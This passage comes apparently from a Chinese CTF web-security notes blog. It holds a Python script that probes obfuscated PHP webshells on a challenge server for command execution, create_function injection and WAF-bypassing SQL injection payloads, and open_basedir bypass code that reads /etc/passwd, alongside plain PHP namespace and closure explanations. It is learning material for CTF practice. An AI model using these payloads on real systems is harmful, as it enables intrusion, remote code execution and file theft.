<li><p>所以可以构造如下 URL：<br><code>?foo=&#123;&quot;bar1&quot;:&quot;2022asd&quot;,&quot;bar2&quot;:[[0],2,3,4,5],&quot;a2&quot;:&quot;me7eorite&quot;&#125;&amp;cat[1][]=&quot;1&quot;&amp;dog=what&amp;cat[0]=%00me7e2021</code></p>
</li>
</ul>
<hr>
<h2 id="代码混淆-强网杯-2019-高明的黑客"><a href="#代码混淆-强网杯-2019-高明的黑客" class="headerlink" title="代码混淆 (强网杯 2019 - 高明的黑客)"></a>代码混淆 (强网杯 2019 - 高明的黑客)</h2><ul>
<li><p>首页提示了源码泄露，下载下来后发现有 3000 多个文件，而且文件中有 <code>eval</code> 还有 <code>assert</code>，但是有些没有执行命令的功能，似乎是被混淆了。</p>
</li>
<li><p>通过编写一个脚本遍历这些 <code>eval</code> 和 <code>assert</code> 方法找到一个能够执行命令的功能。exp 如下：</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;start：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line"></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)                                           </span><br><span class="line">filePath = <span class="string">r&quot;H:\Programmar\phpstudy_pro\WWW\src&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    </span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                             </span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                           </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()                                                </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            </span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                     </span><br><span class="line">    params = &#123;&#125;                                                       </span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://101.43.122.252:8004/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)          </span><br><span class="line">    req.close()                                                </span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    </span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                              </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                               </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                   </span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;file: &#x27;</span>+file+<span class="string">&quot;  and param:%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;endtime: &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                                            </span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<ul>
<li>替换脚本中的地址为本地 PHP 解压后的地址，修改 URL 地址方便测试能够执行命令。</li>
</ul>
<p><img src="/WritenUp.assets%5Cimage-20220529013728647.png" alt="image-20220529013728647"></p>
<ul>
<li>因为写的是多线程会出现无法中断的情况，需要留意一下这个文件。</li>
</ul>
<p><img src="/WritenUp.assets%5Cimage-20220529013509303.png" alt="image-20220529013509303"></p>
<ul>
<li>然后再题目环境中执行命令查看 <code>flag.txt</code> 获取到 flag</li>
</ul>
<p><img src="/WritenUp.assets%5Cimage-20220529014035445.png" alt="image-20220529014035445"></p>
<p><code>flag&#123;this_is_smart_hacker_flag&#125;</code></p>
<hr>
<h2 id="small-tips："><a href="#small-tips：" class="headerlink" title="small tips："></a>small tips：</h2><ul>
<li><code>100.0010</code> 正和反值相等但并非是回文序列</li>
<li><code>get&#123;var]</code>  ?var[变量名]  ?var[template][tp1]&#x3D;xxx&amp;var[template][tp2]&#x3D;xxx  数组 template 中的 tp1<ul>
<li>var[]&#x3D;aaaa 默认传了 var[0]&#x3D;aaaa</li>
<li>通过变量覆盖<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$GET</span>[<span class="string">&quot;flag&quot;</span>]);	</span><br></pre></td></tr></table></figure>
传 <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code></li>
</ul>
</li>
</ul>
<hr>
<h2 id="PHP-特性"><a href="#PHP-特性" class="headerlink" title="PHP 特性"></a>PHP 特性</h2><ol>
<li><p>我们知道 PHP 将查询字符串（在 URL 或正文中）转换为内部 <code>$=GET</code> 或的关联数组 <code>$_POST</code>。例如：<code>/?foo=bar</code> 变成 <code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code> 会转换为 <code>Array([news_id] =&gt; 42)</code>。如果一个 IDS&#x2F;IPS 或 WAF 中有一条规则是当 <code>news_id</code> 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%<span class="number">20</span>news[id%<span class="number">00</span>=<span class="number">42</span><span class="string">&quot;+AND+1=0--</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>上述 PHP 语句的参数 <code>%20news[id%00</code> 的值将存储到 <code>$_GET[&quot;news_id&quot;]</code> 中。</p>
</li>
<li><p>PHP 需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<ol>
<li>删除空白符</li>
<li>将某些字符转换为下划线（包括空格）<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">20</span>foo_bar%<span class="number">00</span>            	                foo_bar            	                foo_bar           </span><br><span class="line">foo%<span class="number">20</span>bar%<span class="number">00</span>            	          foo bar            	        foo_bar         </span><br><span class="line">foo%<span class="number">5</span>bbar            	                foo[bar            	              foo_bar     </span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><code>?%20num=var_dump(scandir(chr(47)))</code></p>
</li>
<li><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code> 表示当前 php 文件相对于网站根目录的位置地址，例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.5idev.com/php/ ：/php/index.php</span></span><br><span class="line">http:<span class="comment">//www.5idev.com/php/index.php ：/php/index.php</span></span><br><span class="line">http:<span class="comment">//www.5idev.com/php/index.php?test=foo ：/php/index.php</span></span><br><span class="line">http:<span class="comment">//www.5idev.com/php/index.php/test/foo ：/php/index.php/test/foo</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>basename</code> 则是返回路径中的文件名部分。但是 basename 有个特性，如果文件名是一个不可见字符，便会将上一个目录作为返回值。比如：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br></pre></td></tr></table></figure></li>
<li><code>basename</code> 例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var1</span>=<span class="string">&quot;/config.php/test&quot;</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(<span class="variable">$var1</span>)	=&gt; test</span><br><span class="line"><span class="variable">$var2</span>=<span class="string">&quot;/config.php/%ff&quot;</span></span><br><span class="line"><span class="title function_ invoke__">basename</span>(<span class="variable">$var2</span>)	=&gt;	config.php</span><br></pre></td></tr></table></figure></li>
<li>当我们访问一个 <code>存在的文件/不存在的文件</code> 这个 URL 时，php 会自动忽略多余的不存在的部分，比如下面两种 URL：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php</span><br><span class="line">/index.php/dosent_exist.php</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p><code>include</code> 有一个很有趣的特性：</p>
</li>
</ol>
<ul>
<li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件<ul>
<li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>CURLOPT_POSTFIELDS</strong></li>
</ol>
<ul>
<li>全部数据使用 HTTP 协议中的 “POST” 操作来发送。</li>
</ul>
<p>要发送文件，在文件名前面加上 <code>@</code> 前缀并使用完整路径。 文件类型可在文件名后以 <code>;type=mimetype</code> 的格式指定。这个参数可以是 <code>urlencoded</code> 后的字符串，类似 <code>&#39;para1=val1&amp;para2=val2&amp;...&#39;</code>，也可以使用一个以字段名为键值，字段数据为值的数组。如果 <code>value</code> 是一个数组，<code>Content-Type</code> 头将会被设置成 <code>multipart/form-data</code>。从 PHP 5.2.0 开始，使用 <code>@</code> 前缀传递文件时，<code>value</code> 必须是个数组。从 PHP 5.5.0 开始, <code>@</code> 前缀已被废弃，文件可通过 <code>CURLFile</code> 发送。设置 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>true</code> 可禁用 <code>@</code> 前缀发送文件，以增加安全性。</p>
<ul>
<li><p><strong>CURLOPT_SAFE_UPLOAD</strong></p>
</li>
<li><p>默认 <code>true</code>。禁用 <code>@</code> 前缀在 <code>CURLOPT_POSTFIELDS</code> 中发送文件。意味着 <code>@</code> 可以在字段中安全地使用了。可使用 <code>CURLFile</code> 作为上传的代替。</p>
</li>
<li><p>PHP 5.5.0 中添加，默认值 <code>false</code>。 PHP 5.6.0 改默认值为 <code>true</code>。PHP 7 删除了此选项， 必须使用 <code>CURLFile</code> interface 来上传文件。</p>
</li>
<li><p>@ 符号出现了。这里的意思就是如果 <code>CURLOPT_SAFE_UPLOAD</code> 为 <code>False</code>，那么在 <code>CURLOPT_POSTFIELDS</code> 要发送的文件名前面加上 <code>@</code> 就可以使用完整路径读取文件了。此时问题又来到了经典的文件任意读取。问题是，读取啥文件呢？我们现在完全不知道 <code>flag</code> 文件在哪。</p>
</li>
</ul>
<hr>
<h2 id="上传还读取"><a href="#上传还读取" class="headerlink" title="上传还读取"></a>上传还读取</h2><ol>
<li><strong>无参函数可接受参数</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">a</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>命名空间</strong></li>
</ol>
<ul>
<li>可以简单地理解为一个“文件夹”或“目录”，它用来组织和管理代码中的类、函数、常量等元素，避免名称冲突。</li>
<li>命名空间 A 和命名空间 B 就像是两个文件夹，每个文件夹里都有一个名为 <code>sayHello()</code> 的函数。由于它们处于不同的命名空间（文件夹）中，所以函数不会互相冲突。</li>
<li>当你在 PHP 脚本中不指定命名空间时，代码运行在全局命名空间中。PHP 不允许在全局命名空间中重写内置函数（如 <code>sha1()</code>）。</li>
<li>命名空间的声明方式有两种：<strong>封闭命名空间</strong> 和 <strong>开放命名空间</strong>。你提到的 <code>namespace interesting;</code> 是 <strong>开放命名空间</strong> 的一种声明方式，它不需要使用 <code>&#123;&#125;</code> 包围代码块。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">test1</span>&#123;</span><br><span class="line">	<span class="title class_">function</span> <span class="title class_">a</span>()&#123;</span><br><span class="line">		<span class="title class_">echo</span> &#x27;<span class="title class_">a</span>&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">test2</span>&#123;</span><br><span class="line">	<span class="title class_">function</span> <span class="title class_">b</span>()&#123;</span><br><span class="line">		<span class="title class_">echo</span> &#x27;<span class="title class_">b</span>&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">phpinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;phpinfo changed&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	\<span class="title class_">test1</span>\<span class="title class_">a</span>(); <span class="comment"># 输出: a</span></span><br><span class="line">	\test2\<span class="title function_ invoke__">b</span>(); <span class="comment"># 输出: b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>php 里默认命名空间是 <code>\</code>，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 <code>function_name()</code> 调用，调用的时候其实相当于写了一个相对路径；而如果写 <code>\function_name()</code> 这样调用函数，则其实是写了一个绝对路径。</li>
<li>如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">MyNamespace</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpinfo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Custom phpinfo in MyNamespace&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();  <span class="comment">// 调用 MyNamespace\phpinfo()，输出 &quot;Custom phpinfo in MyNamespace&quot;</span></span><br><span class="line">\<span class="title function_ invoke__">phpinfo</span>(); <span class="comment">// 调用全局命名空间中的 phpinfo()，输出 PHP 配置信息</span></span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>传 <code>\create_function</code></li>
</ul>
<ol start="3">
<li><strong>匿名函数</strong></li>
</ol>
<ul>
<li>变量赋值示例<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Hello %s\r\n&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;World&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
<li>回调函数对匿名函数的调用<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&#x27;~-([a-z])~&#x27;</span>, function (<span class="variable">$match</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;, <span class="string">&#x27;hello-world&#x27;</span>);</span><br><span class="line"><span class="comment">// 输出 helloWorld</span></span><br></pre></td></tr></table></figure></li>
<li>使用 <code>USE</code> 闭包</li>
<li>可以从父作用域中继承变量。 任何此类变量都应该用 <code>use</code> 语言结构传递进去。 <code>PHP7.1</code> 起，不能传入此类变量：<code>superglobals</code>、<code>$this</code> 或者和参数重名。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">#echo $example();  // Notice: Undefined variable: message </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$message</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$example</span>();  <span class="comment">// string(5) &quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&#x27;world&#x27;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$example</span>();   <span class="comment">//string(5) &quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$example</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$arg</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$message</span></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$arg</span> . <span class="string">&#x27; &#x27;</span> . <span class="variable">$message</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$example</span>(<span class="string">&quot;hello&quot;</span>);   <span class="comment">// string(11) &quot;hello world&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><strong>open_basedir</strong></li>
</ol>
<ul>
<li><p>是 PHP 中的一个配置选项，用于限制脚本可以访问的文件系统路径范围。</p>
</li>
<li><p>例子 <code>open_basedir = /var/www/html/:/tmp/</code>   PHP 脚本只能访问 <code>/var/www/html/</code> 目录及其子目录，和 <code>/tmp/</code> 目录。</p>
</li>
<li><p>php.ini 文件中设置 <code>open_basedir</code> 选项。</p>
</li>
<li><p><strong>绕过方法</strong>：</p>
<ul>
<li>利用 <code>ini_set</code> 和 <code>chdir</code>，PHP 配置中未禁用 <code>ini_set</code> 的使用。</li>
</ul>
<p>参考：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;subDir&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>利用 <code>symlink</code></strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g/&#x27;</span>,<span class="number">0777</span>,<span class="literal">TRUE</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html/a/b/c/d/e/f/g&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html:bar/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;foo/../../../../../../&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">symlink</span>(<span class="string">&#x27;/var/www/html&#x27;</span>,<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;bar/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ol start="5">
<li><strong>PHP 是一门动态语言</strong></li>
</ol>
<ul>
<li>动态语言指在运行时确定数据类型的语言，它拥有一些独特的特性如：动态变量、动态函数执行等。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="comment">#$a 是 $_GET 的中间变量，$_GET 是最终变量</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$a</span>); <span class="comment">//第一个$是找到$a是_GET第二个是找到$_GET 想$this</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST</span> = <span class="string">&#x27;asdf&#x27;</span>;</span><br><span class="line"><span class="variable">$asdf</span> = <span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_POST</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>可变属性名</strong></p>
